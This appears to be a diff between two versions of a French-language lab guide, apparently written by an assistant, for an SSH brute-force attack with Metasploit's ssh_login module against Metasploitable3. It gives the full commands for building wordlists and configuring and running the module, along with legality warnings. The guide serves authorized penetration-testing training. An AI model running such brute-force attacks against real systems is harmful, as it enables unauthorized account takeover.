@@ -1,50 +1,85 @@
-Merci d'avoir partagé votre document et vos progrès ! Il semble que vous ayez trouvé un répertoire accessible par Metasploit, ce qui est un excellent pas en avant. Maintenant que vous avez identifié un répertoire où Metasploit peut accéder aux fichiers nécessaires, vous pouvez procéder à la configuration de vos attaques, notamment la connexion SSH.
+Voici une version complète du README qui intègre toutes les étapes nécessaires pour mener une attaque par force brute SSH utilisant Metasploit contre une machine cible, spécifiquement Metasploitable3, en partant de l'installation du système d'exploitation jusqu'à la réalisation de l'attaque.
 
-Voici comment vous pouvez procéder pour utiliser Metasploit afin de vous connecter via SSH en utilisant les fichiers de noms d'utilisateurs et de mots de passe que vous avez préparés :
+---
 
-### Étape 1: Déplacement des fichiers dans le répertoire accessible
-Puisque Metasploit a accès au répertoire `/snap/metasploit-framework/`, déplacez vos fichiers `usernames.txt` et `passwords.txt` dans ce répertoire.
+## README - Configuration et Utilisation de Metasploit pour Attaque par Force Brute SSH
 
-1. **Déplacez les fichiers**:
+### Description
+Ce document fournit des instructions détaillées pour utiliser Metasploit afin de lancer une attaque par force brute SSH contre une machine cible, en l'occurrence Metasploitable3. Ce guide couvre la préparation des fichiers nécessaires, la configuration de Metasploit, et le lancement de l'attaque.
+
+### Prérequis
+- **Système d'exploitation**: Linux (Ubuntu 22.04 préféré)
+- **Metasploit Framework installé**
+- **Accès administratif sur la machine où Metasploit est installé**
+- **Machine cible configurée et accessible sur le réseau**
+
+### Installation de Metasploit (si non installé)
+1. Ouvrez un terminal.
+2. Exécutez les commandes suivantes pour installer Metasploit:
    ```bash
-   sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
-   sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
+   sudo apt update
+   sudo apt install metasploit-framework
    ```
 
-2. **Assurez-vous que les fichiers sont dans le bon répertoire**:
-   ```bash
-   ls -l /snap/metasploit-framework/usernames.txt
-   ls -l /snap/metasploit-framework/passwords.txt
-   ```
+### Étape 1: Préparation des Fichiers de Noms d'Utilisateurs et de Mots de Passe
+1. **Création des fichiers** :
+   - Créez les fichiers contenant les noms d'utilisateurs et les mots de passe que vous prévoyez d'utiliser pour l'attaque.
+     ```bash
+     echo -e "root\nadmin\nuser\ntest\nguest\ninfo\noperator" > /home/eleve/usernames.txt
+     echo -e "password\n123456\nadmin\nguest\n123123\npassword1\nqwerty\n12345\n123456789\ntest" > /home/eleve/passwords.txt
+     ```
 
-### Étape 2: Configuration de Metasploit
-Démarrez Metasploit et configurez-le pour utiliser les fichiers dans le nouveau répertoire.
+2. **Modification des permissions** :
+   - Assurez-vous que les fichiers sont lisibles.
+     ```bash
+     chmod 644 /home/eleve/usernames.txt
+     chmod 644 /home/eleve/passwords.txt
+     ```
 
-1. **Lancez Metasploit**:
-   ```bash
-   msfconsole
-   ```
+3. **Changement de propriétaire** :
+   - Changez le propriétaire des fichiers pour garantir que Metasploit peut y accéder.
+     ```bash
+     sudo chown $(whoami) /home/eleve/usernames.txt
+     sudo chown $(whoami) /home/eleve/passwords.txt
+     ```
 
-2. **Configurez le module de scanner SSH**:
-   ```bash
-   use auxiliary/scanner/ssh/ssh_login
-   set RHOSTS 172.28.128.3
-   set USER_FILE /snap/metasploit-framework/usernames.txt
-   set PASS_FILE /snap/metasploit-framework/passwords.txt
-   set VERBOSE true
-   ```
+### Étape 2: Déplacement des Fichiers dans un Répertoire Accessible par Metasploit
+- Déplacez les fichiers dans un répertoire où Metasploit a les permissions de lecture.
+  ```bash
+  sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
+  sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
+  ```
 
-### Étape 3: Exécution du Module
-Maintenant que tout est configuré, vous pouvez lancer le module pour tenter de vous connecter via SSH.
+### Étape 3: Configuration de Metasploit
+1. **Lancement de Metasploit** :
+   - Ouvrez Metasploit en utilisant la commande suivante :
+     ```bash
+     msfconsole
+     ```
 
-```bash
-run
-```
+2. **Configuration du module SSH** :
+   - Configurez Metasploit pour utiliser les fichiers déplacés et ciblez la machine appropriée.
+     ```bash
+     use auxiliary/scanner/ssh/ssh_login
+     set RHOSTS 172.28.128.3
+     set USER_FILE /snap/metasploit-framework/usernames.txt
+     set PASS_FILE /snap/metasploit-framework/passwords.txt
+     set VERBOSE true
+     ```
 
-Cela lancera l'attaque par force brute en utilisant les noms d'utilisateurs et mots de passe que vous avez spécifiés. Gardez un œil sur la sortie de la console pour voir si des identifiants valides sont trouvés.
+### Étape 4: Lancement de l'Attaque
+- Exécutez le module pour commencer l'attaque.
+  ```bash
+  run
+  ```
 
 ### Conseils de Sécurité
-- **Permissions**: Assurez-vous que les permissions des fichiers sont correctes pour éviter l'accès non autorisé.
-- **Légalité**: Confirmez que vous avez l'autorisation de tester la machine cible. L'utilisation de ces outils sur des réseaux ou des machines sans consentement est illégale.
+- **Permissions**: Vérifiez régulièrement que les permissions des fichiers sont correctement configurées pour éviter tout accès non autorisé.
+- **Légalité**: Assurez-vous d'avoir l'autorisation explicite de tester la machine cible. L'utilisation de Metasploit sans consentement est illégale.
 
-Avec ces étapes, vous devriez être en mesure de réaliser votre test de pénétration SSH avec Metasploit. Si vous rencontrez des problèmes, n'hésitez pas à vérifier les logs de Metasploit pour plus d'informations sur les erreurs éventuelles.
+### Dépannage
+- Si des problèmes surviennent, vérifiez les logs de Metasploit pour des détails sur les erreurs. Assurez-vous que les chemins des fichiers sont corrects et que les fichiers ne sont pas corrompus.
+
+---
+
+Ce document devrait vous fournir une base solide pour l'utilisation sécurisée et efficace de Metasploit dans vos tests de pénétration. Assurez-vous de suivre les meilleures pratiques de sécurité et de conformité légale lors de vos tests.
